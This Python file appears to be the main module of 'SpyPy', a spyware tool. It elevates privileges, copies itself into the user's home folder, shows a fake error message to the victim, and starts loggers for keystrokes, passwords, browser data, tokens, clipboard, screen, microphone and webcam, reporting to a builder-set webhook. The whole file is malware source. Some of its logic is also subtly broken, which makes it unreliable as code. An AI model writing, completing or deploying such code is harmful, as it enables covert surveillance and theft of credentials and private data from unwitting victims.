import tempfile
import os
import threading
import shutil
import sys
import subprocess
import ctypes


from utils import *
from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.password_logger import PasswordLogger
from loggers.screen_logger import ScreenLogger
from loggers.token_logger import TokenLogger
from loggers.webcam_logger import WebcamLogger

###############################
# DO NOT MODIFY THESE VALUES! #
# THEY ARE SET BY THE BUILDER #
WEBHOOK_URL = ""              #
SOFTWARE_EXE_NAME = ""        #
SOFTWARE_DIR_NAME = ""        #
CUSTOM_ERROR_MESSAGE = None   #
###############################


class SpyPy:
    def __init__(self):
        if not is_admin():
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
            except Exception as e:
                send_webhook(
                    WEBHOOK_URL, "FATAL ERROR: COULD NOT GET ADMIN PRIVILEGES. PLEASE TRY AGAIN OR CHECK LOGS."
                )
                os._exit(1)

        self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
        self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)

        if not os.path.exists(self.software_dir):
            os.makedirs(self.software_dir)
        if not os.path.exists(self.logs_path):
            os.makedirs(self.logs_path)

        self.is_exe = is_exe()
        self.first_run_flag = os.path.join(self.logs_path, f"{SOFTWARE_EXE_NAME}.flag")

        self.setup()

        self.loggers = []
        try:
            if self.is_exe:
                logger_class_names = [
                    "BrowserLogger",
                    "ClipboardLogger",
                    "InputLogger",
                    "MicrophoneLogger",
                    "PasswordLogger",
                    "ScreenLogger",
                    "TokenLogger",
                    "WebcamLogger",
                ]
                for logger_class_name in logger_class_names:
                    if globals().get(logger_class_name):
                        self.loggers.append(globals()[logger_class_name]())
            else:
                logger_classes = [
                    BrowserLogger(),
                    ClipboardLogger(),
                    InputLogger(),
                    MicrophoneLogger(),
                    PasswordLogger(),
                    ScreenLogger(),
                    TokenLogger(),
                    WebcamLogger(),
                ]
            for logger in logger_classes:
                self.loggers.append(logger())
        except Exception as e:
            send_webhook(
                WEBHOOK_URL, "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
            )
            os._exit(1)

        self.threads = []

    def start(self):
        for logger in self.loggers:
            if logger:
                thread = threading.Thread(
                    target=logger.start, name=type(logger).__name__
                )
                thread.start()
                self.threads.append(thread)

    def stop(self):
        os._exit(0)

    def setup(self):
        if self.is_exe:
            if not os.path.exists(self.first_run_flag):
                try:
                    send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed for the first time. Setting up...")
                    open(self.first_run_flag, "w").close()
                    current_exe = sys.executable
                    new_exe = os.path.join(
                        self.software_dir, os.path.basename(current_exe)
                    )
                    shutil.copyfile(current_exe, new_exe)
                    subprocess.Popen([new_exe])
                    if CUSTOM_ERROR_MESSAGE:
                        display_error_message(
                            f"A fatal error occurred while running {SOFTWARE_EXE_NAME}:",
                            CUSTOM_ERROR_MESSAGE,
                        )
                    os._exit(0)
                except Exception as e:
                    send_webhook(
                        "FATAL ERROR: COULD NOT SETUP FIRST RUN. PLEASE TRY AGAIN OR CHECK LOGS."
                    )
                    os._exit(1)
            else:
                send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed. Starting SpyPy...")
        else:
            send_webhook(WEBHOOK_URL, f"SpyPy has been executed...")
            if CUSTOM_ERROR_MESSAGE:
                display_error_message("Error", CUSTOM_ERROR_MESSAGE)


if __name__ == "__main__":
    SpyPy().start()
